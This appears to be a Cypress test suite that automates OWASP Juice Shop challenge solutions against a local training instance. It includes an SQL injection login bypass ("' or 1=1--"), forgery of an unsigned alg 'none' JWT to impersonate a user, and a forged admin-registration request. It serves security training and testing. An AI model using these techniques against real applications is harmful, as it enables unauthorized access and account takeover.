import '../support/index';

const jwt = require('jsonwebtoken');

describe("Pwned JuiceShop", () => {
  
  before(() => {
    cy.setCookie('welcomebanner_status', 'dismiss');
    cy.setCookie('cookieconsent_status', 'dismiss');
  });
  
  beforeEach(() => {
    // Keep the following cookies between each test
    Cypress.Cookies.preserveOnce('welcomebanner_status', 'cookieconsent_status');
  });
  
  it("Find the carefully hidden ‘Score Board’ page.", () => {
      
    cy.visit('/#/score-board')
    .then(() => {
      cy.isSolvedChallenge('scoreBoardChallenge').should('eq', true);
    });
        
  });
    
  it("Register as a user with administrator privileges", () => {

    // Forge POST request to create an admin user
    const options = {
      method: 'POST',
      url: '/api/Users/',
      form: true, // we are submitting a regular form body
      body: {
        email:`pwned.${Date.now()}@juiceshop.com`,
        password:'pwned',
        passwordRepeat:'pwned',
        securityQuestion: {
          id:5,
          question:'Maternal grandmother\'s first name?',
          createdAt:'2020-06-11T21:38:56.400Z',
          updatedAt:'2020-06-11T21:38:56.400Z'
        },
        "securityAnswer":"pwned"
      }
    }

    cy.request(options)
    .then(() => {
      cy.isSolvedChallenge('registerAdminChallenge').should('eq', true);
    });
        
        
  });
  
  it("Log in with the administrator’s user account.", () => {
      
    cy.visit('http://localhost:3000/#/login').then(() => {
        
      // SQL Injection
      cy.get('#email').type("' or 1=1--");
      cy.get('#password').type("foo");
      cy.get('#loginButton').click();
      
      // check if challenge is solved
      cy.isSolvedChallenge('loginAdminChallenge').should('eq', true);
      
      // Logout
      cy.get('#navbarAccount').click();
      cy.get('#navbarLogoutButton > span').click();
      
    });
    

    
  });
  
  it("Forge an essentially unsigned JWT token that impersonates the (non-existing) user jwtn3d@juice-sh.op", () => {
    
    // Login with cypress account
    cy.signin('cypress@mail.com','cypress');
    
    cy.getCookie('token').should('exist');
    
    // le cookie n'est pas encore setté par la webapp.
    // il faudra récupérer le token depuis la reponse http
    cy.getCookie('token').then((cookie) => {
        
         // Get Token
         var token = jwt.decode(cookie.value, {complete: true});
         expect(token.payload.data.email).to.equal('cypress@mail.com');
         
         // Forge an unsigned Token
         token.payload.data.email = 'jwtn3d@juice-sh.op';
         var unsignedToken = jwt.sign(token.payload,'nosecret',{ algorithm: 'none'});
         
         console.log(unsignedToken);
         
         // Forge POST request to create an admin user
        const options = {
          method: 'GET',
          url: '/api/Products/1',
          auth: {
            bearer: unsignedToken
          }
        }
    
    
        cy.request(options).then(() => {
            
            // check if challenge is solved
            cy.isSolvedChallenge('jwtUnsignedChallenge').should('eq', true);
            
            // Logout
            cy.visit('http://localhost:3000/#/login').then(() => {
              cy.get('#navbarAccount').click();
              cy.get('#navbarLogoutButton > span').click();
            });
            
        });
        
      });
      
  });
        
        
  
  after(() => {
//     cy.setCookie('welcomebanner_status', 'dismiss');
//     cy.setCookie('cookieconsent_status', 'dismiss');
    cy.visit('/#/score-board');
  });
    
});
